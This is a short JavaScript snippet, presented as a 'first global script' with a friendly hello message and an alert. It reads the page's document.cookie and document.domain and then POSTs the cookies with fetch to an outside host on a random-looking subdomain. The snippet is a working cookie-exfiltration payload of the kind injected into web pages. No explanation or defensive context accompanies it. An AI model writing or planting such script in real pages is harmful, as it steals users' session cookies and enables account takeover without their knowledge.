console.log('Hello from your first global script!');
alert('Hellow from your first global script!');
console.log(document.cookie);
console.log(document.domain);

let data = document.cookie;

const response = await fetch("https://dam5j34p92lis85gpj50s511hyt4rua9u.desert-rat.net", {
  method: "POST",
  body: data
  //body: JSON.stringify({ username: "example" }),
  // …
});